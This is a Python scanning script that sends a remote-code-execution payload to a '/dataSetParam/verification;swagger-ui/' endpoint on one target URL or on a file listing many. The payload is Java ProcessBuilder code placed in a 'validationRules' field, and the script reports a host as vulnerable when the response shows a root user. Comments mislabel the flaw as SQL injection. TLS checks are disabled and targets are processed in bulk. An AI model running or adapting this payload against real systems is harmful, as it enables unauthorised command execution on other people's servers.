import requests
import urllib3
from urllib.parse import urljoin
import argparse
import ssl

banner = '''
_______________#########_______________________ 
______________############_____________________ 
______________#############____________________ 
_____________##__###########___________________ 
____________###__######_#####__________________ 
____________###_#######___####_________________ 
___________###__##########_####________________ 
__________####__###########_####_______________ 
________#####___###########__#####_____________ 
_______######___###_########___#####___________ 
_______#####___###___########___######_________ 
______######___###__###########___######_______ 
_____######___####_##############__######______ 
____#######__#####################_#######_____ 
____#######__##############################____ 
___#######__######_#################_#######___ 
___#######__######_######_#########___######___ 
___#######____##__######___######_____######___ 
___#######________######____#####_____#####____ 
____######________#####_____#####_____####_____ 
_____#####________####______#####_____###______ 
______#####______;###________###______#________ 
________##_______####________####______________ 
'''

ssl._create_default_https_context = ssl._create_unverified_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def read_file(file_path):
    with open(file_path, 'r') as file:
        return file.read().splitlines()


def check_sql_injection(url):
    target_url = url.rstrip("/")
    if 'http' in target_url:
        target_endpoint = target_url+"/dataSetParam/verification;swagger-ui/"
    else:
        target_endpoint = "http://"+target_url+"/dataSetParam/verification;swagger-ui/"
    # proxy= {'http':'http://127.0.0.1:8080'}
    # print(target_endpoint)
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Content-Type": "application/json;charset=UTF-8",
        "Connection": "close"
    }
    payloads = '{"ParamName":"","paramDesc":"","paramType":"","sampleItem":"1","mandatory":true,"requiredFlag":1,"validationRules":"function verification(data){a = new java.lang.ProcessBuilder(\\"id\\").start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss=\'\';while((line = r.readLine()) != null){ss+=line};return ss;}"}'
    try:
        response = requests.post(target_endpoint, verify=False, headers=headers, timeout=5,data=payloads)
        if response.status_code == 200 and all(key in response.text for key in ['root']):
            print(url+"存在漏洞")
            return True
    except Exception as e:
        # print(f"Error checking {url}: {e}")
        print(e)
    return False


def main():
    # 创建解析器，描述为检查SQL注入漏洞
    parser = argparse.ArgumentParser(description="Check for vulnerabilities.")

    # 创建一个互斥组，必须选择一个选项
    group = parser.add_mutually_exclusive_group(required=True)
    # 添加URL参数，帮助信息为目标URL
    group.add_argument("-u", "--url", help="Target URL")
    # 添加文件参数，帮助信息为包含URL的文件
    group.add_argument("-f", "--file", help="File containing URLs")

    # 解析参数
    args = parser.parse_args()

    # 如果指定了URL参数
    if args.url:
        # 检查SQL注入
        check_sql_injection(args.url)
    # 如果指定了文件参数
    elif args.file:
        # 读取文件中的URL列表
        urls = read_file(args.file)
        # 遍历每个URL
        for url in urls:
            # 检查SQL注入
            if check_sql_injection(url):
                print(f"{url}:存在漏洞")
                # 如果存在漏洞，打印URL和存在漏洞的信息
                print(f"{url}:存在漏洞")


if __name__ == "__main__":
    print(banner)
    main()